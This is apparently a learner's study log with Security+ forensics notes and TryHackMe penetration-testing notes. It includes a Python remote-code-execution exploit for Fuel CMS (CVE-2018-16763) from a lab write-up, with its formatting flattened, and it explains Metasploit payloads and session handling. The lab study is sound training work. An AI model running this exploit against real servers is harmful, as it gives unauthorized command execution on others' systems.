---
title: 'ITPro.TV: CompTIA Security+ (SY0-601) &amp; TryHackMe: Jr. Penetration Tester'
date: 2022-04-13 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-04-13-itprotv-comptia-security-plus-and-tryhackme-jr-penetration-tester.html
author: 100007
---

# ITPro.TV: CompTIA Security+ (SY0-601) & TryHackMe: Jr. Penetration Tester

**author:** Nathan Acks  
**date:** 2022-04-13

# ITPro.TV: CompTIA Security+ (SY0-601)

## Digital Forensics Concepts

Order of volatility:

- CPU cache & registers (good luck!)
- Routing tables, process tables, ARP cache, kernel stats
- (Non-Kernel) RAM
- Swap, /tmp, etc.
- Storage, VM snapshots
- Archival data, backups, logs, print-outs

Preservation and documentation notes:

- Timestamp everything
- Note timezone differences
- Written reports and logs (also use these to establish the chain of custody)
- Witness testimony
- Use file hashes

Chain of custody is often represented as a simple paper log/form.

Tools of the trade:

- FTK Imager
- WinHex
- Autopsy
- EnCase Forensic
- `dd`

# TryHackMe: Jr. Penetration Tester

## Vulnerability Capstone

I couldn’t get any of the exploits from Exploit DB to work for me, so I wound up doing a web search that landed me on a write-up for this room in GitHub; the provided exploit code is a little rough, but can be cleaned up to produce nice output without too much work:

```
#!/usr/bin/python3

# Derived from https://github.com/SlizBinksman/THM-Vulnerability_Capstone-CVE-2018-16763/blob/main/rce.py

import argparse
import requests
from sys import exit
from bs4 import BeautifulSoup
from socket import error
delimeter1 = '<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">'
delimeter2 = '</div>'
def exploit():
while True:
try:
payload = input("
[+] OS Command: ")
response = requests.get(f"{args.URL}/fuel/pages/select/?filter='%2Bpi(%24a%3D('system'))%2B%24a('{payload}')%2B'")
htmlText = str(BeautifulSoup(response.text,'html.parser'))
array1 = htmlText.split(delimeter1)
array2 = array1[1].split(delimeter2)
print('
' + array2[-1].replace('
',''))
except error:
exit('
[-] Could Not Connect To Server')
if __name__ == ' __main__':
mainArguments = argparse.ArgumentParser()
mainArguments.add_argument('URL',help='Target Website Hosting Vulnerable CMS',type=str)
args = mainArguments.parse_args()
try:
exploit()
except KeyboardInterrupt:
exit('
[!] Quitting')
```

- [THM-Vulnerability\_Capstone-CVE-2018-16763](https://github.com/SlizBinksman/THM-Vulnerability_Capstone-CVE-2018-16763)
- [THM-Vulnerability\_Capstone-CVE-2018-16763 / rce.py](https://github.com/SlizBinksman/THM-Vulnerability_Capstone-CVE-2018-16763/blob/main/rce.py)
- [Python String split() Method](https://www.w3schools.com/python/ref_string_split.asp)
- [Replace all newline characters using python](https://stackoverflow.com/questions/54760850/replace-all-newline-characters-using-python)

## Main Components of Metasploit

Module categories:

- Auxiliary (odds-n-ends)
- Encoders (re-encode exploits to thwart signature-based anti-malware solutions)
- Evasion (attempt to directly evade anti-malware solutions)
- Exploits
- NOPS (no-op code that can be used to pad exploits to a needed size)
- Payloads (what you want to run if the exploit is successful; often, but not always, some kind of shell)
- Post (additional post-exploitation tools)

Payloads, in turn, can be divided into:

- Singles (self-contained; also indicated by the use of an `_` separating “shell” from the rest of the payload name, as in `shell_reverse_tcp`)
- Stagers (small applications that establish a connection back to the attacker to download a larger, more complex payload)
- Stages (payloads designed to be downloaded by a stager; also indicated by the use of a `/` separating “shell” from the rest of the payload name, as in `shell/reverse_tcp`)

## Msfconsole

You can use msfconsole as a shell, but there’s no redirect functionality.

Use `history` to display a command history.

All settings are scoped to the current module unless explicitly scoped globally (`set -g`).

The `show` command can be used with any module type to list modules of that type, though Metasploit is a bit inconsistent about whether the type should be plural or not (`show auxiliary` vs. `show exploits`). When used in the context of a module, this usage of `show` will attempt to filter additional modules in a sensible way; for example, in the context of a Windows exploit, only Windows-based payloads will be shown.

The `back` command leaves the context of the current module.

Use `info` to get module information (which is not generally the same as “help”, though it often does contain useful informaiton).

We can limit the `search` query to a particular type of module using the `type:` parameter (e.g., `search type:exploit wordpress`).

## Working with Modules

The common `RHOSTS` module option accepts IP addresses, ranges, CIDR networks, and even a file with one target per line (specify as `file:/path/to/file.txt`).

Note that the `PAYLOAD` and `SESSION` parameters are not generally listed by `show options`, but can still be set if desired.

You can reset individual parameters using `unset`, and reset the entire module using `unset all`.

- `set -g` = `setg`
- `unset -g` = `unsetg`
- `run` = `exploit`

Some exploit modules have a `check` option which attempts to determine if a target is vulnerable without actually exploiting it. Alternately, other modules have a paired auxiliary scanner. Many _don’t_ have a check at all. YMMV!

Meterpreter sessions can be backgrounded using the `background` command, and all sessions can be backgrounded using `CTRL + Z`. List sessions using the `sessions` command, and foreground a session using `session -i #`, where `#` is the session number.

